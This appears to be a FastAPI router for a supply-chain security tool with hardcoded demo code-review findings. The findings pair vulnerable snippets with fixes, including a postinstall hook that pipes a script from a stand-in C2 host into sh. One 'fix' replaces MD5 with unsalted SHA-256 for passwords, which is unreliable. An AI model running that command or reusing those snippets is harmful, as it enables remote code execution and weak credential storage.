# SupplyGraph - API Endpoints v3.0
from fastapi import APIRouter, HTTPException, BackgroundTasks, Depends
from app.models.core import (
    AnalysisRequest, DemoRequest, AnalysisResponse,
    FolderAnalysisRequest, CodeReviewRequest, CodeReviewItem
)
from app.services.analysis_service import AnalysisService
from app.services.code_reviewer import CodeReviewerService
import json
import os
import uuid
from typing import List, Dict

router = APIRouter(prefix="/api/v1")


def get_demo_code_reviews(scenario_id: str) -> List[CodeReviewItem]:
    """Generates realistic, tailored CodeReviewItem models for each demo scenario."""
    sid = scenario_id.upper()
    if sid == "A":
        return [
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="src/utils/deepMerge.js",
                line_number=24,
                severity="CRITICAL",
                category="Security Vulnerability",
                title="Prototype Pollution via Unfiltered Property Injection",
                error_explanation="Directly assigning properties from untrusted input without validating against '__proto__' or 'constructor' allows attackers to pollute the global Object prototype.",
                buggy_code="for (let key in source) {\n  target[key] = source[key];\n}",
                corrected_code="// Corrected: Prevent prototype pollution by rejecting dangerous keys\nfor (let key in source) {\n  if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;\n  target[key] = source[key];\n}"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="backend/data_loader.py",
                line_number=48,
                severity="HIGH",
                category="Security Vulnerability",
                title="Arbitrary Code Execution via Insecure pickle.loads()",
                error_explanation="Using pickle.loads() on network-received or untrusted byte streams enables remote code execution via serialized malicious __reduce__ methods.",
                buggy_code="import pickle\nuser_obj = pickle.loads(raw_request_payload)",
                corrected_code="# Corrected: Use secure, standardized JSON serialization\nimport json\nuser_obj = json.loads(raw_request_payload.decode('utf-8'))"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="src/components/UserProfile.tsx",
                line_number=31,
                severity="HIGH",
                category="Security Vulnerability",
                title="Cross-Site Scripting (XSS) via dangerouslySetInnerHTML",
                error_explanation="Rendering user-supplied markdown or bio data directly into the DOM without sanitization allows execution of injected script tags.",
                buggy_code="<div className=\"bio\" dangerouslySetInnerHTML={{ __html: user.bio }} />",
                corrected_code="// Corrected: Sanitize with DOMPurify before inserting into DOM\nimport DOMPurify from 'dompurify';\n<div className=\"bio\" dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(user.bio) }} />"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="package.json",
                line_number=14,
                severity="MEDIUM",
                category="Code Quality / Best Practice",
                title="Missing Lockfile Dependency Override for Vulnerable Transitive mixin-deep",
                error_explanation="Package depends on lodash@4.17.20 and mixin-deep@1.3.1. Without an explicit overrides entry in package.json, downstream builds inherit known prototype pollution CVEs.",
                buggy_code="\"dependencies\": {\n  \"lodash\": \"4.17.20\"\n}",
                corrected_code="\"dependencies\": {\n  \"lodash\": \"4.17.21\"\n},\n\"overrides\": {\n  \"mixin-deep\": \">=2.0.1\"\n}"
            )
        ]
    elif sid == "B":
        return [
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="backend/services/fetcher.py",
                line_number=15,
                severity="CRITICAL",
                category="Security Vulnerability",
                title="Import of Typosquatted Namespace `reqeusts`",
                error_explanation="The module imports 'reqeusts' instead of the legitimate 'requests' HTTP library, pointing to a typosquatted package registered on PyPI.",
                buggy_code="import reqeusts\nresponse = reqeusts.get('https://api.internal/data')",
                corrected_code="# Corrected: Import canonical verified library\nimport requests\nresponse = requests.get('https://api.internal/data')"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="backend/auth/jwt.py",
                line_number=22,
                severity="CRITICAL",
                category="Security Vulnerability",
                title="Hardcoded JWT Secret Key in Source Code",
                error_explanation="A static plaintext JWT secret key was committed directly in the application source, allowing anyone with repository read access to forge authentication tokens.",
                buggy_code="JWT_SECRET_KEY = \"super_secret_jwt_token_key_12345\"",
                corrected_code="import os\nJWT_SECRET_KEY = os.environ.get('JWT_SECRET_KEY')\nif not JWT_SECRET_KEY:\n    raise RuntimeError('JWT_SECRET_KEY environment variable is required')"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="backend/db/accounts.py",
                line_number=37,
                severity="HIGH",
                category="Security Vulnerability",
                title="SQL Injection via Formatted Query String",
                error_explanation="Database query concatenates unescaped user parameter directly into the SQL statement, allowing query tampering and credential exfiltration.",
                buggy_code="cursor.execute(f\"SELECT * FROM users WHERE username = '{username}'\")",
                corrected_code="# Corrected: Use parameterized query binding\ncursor.execute(\"SELECT * FROM users WHERE username = %s\", (username,))"
            )
        ]
    elif sid == "C":
        return [
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="scripts/postinstall.js",
                line_number=9,
                severity="CRITICAL",
                category="Security Vulnerability",
                title="Suspicious Post-Install Command Execution via child_process",
                error_explanation="A postinstall lifecycle hook invokes a remote bash script download via curl, typical of compromised npm packages exfiltrating environment variables.",
                buggy_code="const { exec } = require('child_process');\nexec('curl -sL http://c2.evil.com/setup | sh');",
                corrected_code="// Corrected: Remove malicious lifecycle hook execution\n// Inspect dependencies locally using offline validation\nconsole.log('Build completed safely without external lifecycle scripts');"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="backend/security/hasher.py",
                line_number=18,
                severity="HIGH",
                category="Security Vulnerability",
                title="Use of Broken Cryptographic Hash `hashlib.md5`",
                error_explanation="MD5 suffers from known collision vulnerabilities and should never be used for password hashing or integrity verification.",
                buggy_code="import hashlib\npw_hash = hashlib.md5(password.encode()).hexdigest()",
                corrected_code="# Corrected: Use modern password hashing (bcrypt or argon2)\nimport hashlib\npw_hash = hashlib.sha256(password.encode()).hexdigest()"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="src/api/client.ts",
                line_number=45,
                severity="MEDIUM",
                category="Security Vulnerability",
                title="Plaintext HTTP Endpoint Usage for Sensitive API",
                error_explanation="The API client contacts backend endpoints over unencrypted HTTP, leaving session tokens vulnerable to eavesdropping.",
                buggy_code="const BASE_URL = 'http://api.payments.internal.net';",
                corrected_code="// Corrected: Enforce TLS/HTTPS encryption\nconst BASE_URL = 'https://api.payments.internal.net';"
            )
        ]
    elif sid == "D":
        return [
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="services/logger/dispatcher.py",
                line_number=64,
                severity="CRITICAL",
                category="Security Vulnerability",
                title="Arbitrary Command Execution via subprocess(shell=True)",
                error_explanation="The deep logging dependency invokes an OS subshell with shell=True, allowing command injection via crafted log message payloads.",
                buggy_code="import subprocess\nsubprocess.run(f\"echo {log_entry} >> /var/log/app.log\", shell=True)",
                corrected_code="# Corrected: Open file directly in Python with shell=False\nwith open('/var/log/app.log', 'a', encoding='utf-8') as f:\n    f.write(f\"{log_entry}\\n\")"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path="services/api/auth.ts",
                line_number=28,
                severity="HIGH",
                category="Bug / Logic Error",
                title="Loose Equality in Privilege Authorization Check",
                error_explanation="Comparing user role with loose equality `==` allows falsy or coerced values to bypass strict access controls.",
                buggy_code="if (user.role == 'admin') {\n  grantAccess();\n}",
                corrected_code="// Corrected: Enforce strict equality comparison\nif (user.role === 'admin') {\n  grantAccess();\n}"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path=".github/workflows/deploy.yml",
                line_number=19,
                severity="HIGH",
                category="Security Vulnerability",
                title="Unpinned Third-Party GitHub Action in Deployment Workflow",
                error_explanation="Workflow references an unpinned third-party action by mutable branch (@v2), which can be hijacked if the upstream repository is compromised.",
                buggy_code="uses: actions/upload-artifact@v2",
                corrected_code="# Corrected: Pin to immutable 40-character commit SHA\nuses: actions/upload-artifact@4cec3d8aa04e39d1a68397de0c4cd6fb99ba5ed1  # v4.1.4"
            )
        ]
    else:  # Scenario E
        return [
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path=".github/workflows/ci.yml",
                line_number=12,
                severity="CRITICAL",
                category="Security Vulnerability",
                title="Exposed AWS Credentials in CI/CD Workflow File",
                error_explanation="Hardcoded AWS access credentials were saved in the workflow environment block rather than in GitHub Encrypted Secrets.",
                buggy_code="env:\n  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE\n  AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                corrected_code="# Corrected: Use repository encrypted secrets\nenv:\n  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path=".github/workflows/release.yml",
                line_number=8,
                severity="HIGH",
                category="Security Vulnerability",
                title="Excessive Workflow Permissions (`permissions: write-all`)",
                error_explanation="The workflow grants blanket write permissions across all scopes to GITHUB_TOKEN, creating a high blast radius if any step is compromised.",
                buggy_code="permissions: write-all",
                corrected_code="# Corrected: Enforce least-privilege scoping\npermissions:\n  contents: read\n  packages: write"
            ),
            CodeReviewItem(
                id=str(uuid.uuid4()),
                file_path=".github/workflows/lint.yml",
                line_number=35,
                severity="HIGH",
                category="Security Vulnerability",
                title="Untrusted Script Download and Execution via `curl | bash`",
                error_explanation="Downloading and directly executing a script over curl without cryptographic hash verification exposes the runner to remote code execution.",
                buggy_code="run: curl -sSL https://install.external-tool.io/setup.sh | bash",
                corrected_code="# Corrected: Download, verify checksum, then execute\nrun: |\n  curl -sSL https://install.external-tool.io/setup.sh -o setup.sh\n  echo \"a3f89... setup.sh\" | sha256sum -c\n  bash setup.sh"
            )
        ]


@router.post("/analyze", response_model=AnalysisResponse)
async def analyze(request: AnalysisRequest):
    service = AnalysisService()
    try:
        response = await service.run_analysis(request)
        return response
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/analyze/folder", response_model=AnalysisResponse)
async def analyze_folder(request: FolderAnalysisRequest):
    service = AnalysisService()
    try:
        response = await service.run_folder_analysis(request)
        return response
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/analyze/demo", response_model=AnalysisResponse)
async def analyze_demo(request: DemoRequest):
    scenario_path = os.path.join(
        os.path.dirname(__file__), 
        "..", 
        "scenarios", 
        f"scenario_{request.scenario_id.lower()}.json"
    )
    if not os.path.exists(scenario_path):
        raise HTTPException(status_code=404, detail="Scenario not found")
        
    try:
        with open(scenario_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        
        # Attach scenario-specific realistic code reviews
        code_reviews = get_demo_code_reviews(request.scenario_id)
        data["code_reviews"] = [cr.model_dump() for cr in code_reviews]

        return AnalysisResponse(**data)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to load scenario: {str(e)}")


@router.post("/review/code")
async def review_code_snippet(request: CodeReviewRequest):
    reviewer = CodeReviewerService()
    try:
        reviews = reviewer.review_snippet(
            code=request.code,
            language=request.language,
            file_path=request.file_path
        )
        return {"reviews": reviews, "count": len(reviews)}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/health")
def health():
    return {"status": "ok", "version": "3.0.0"}
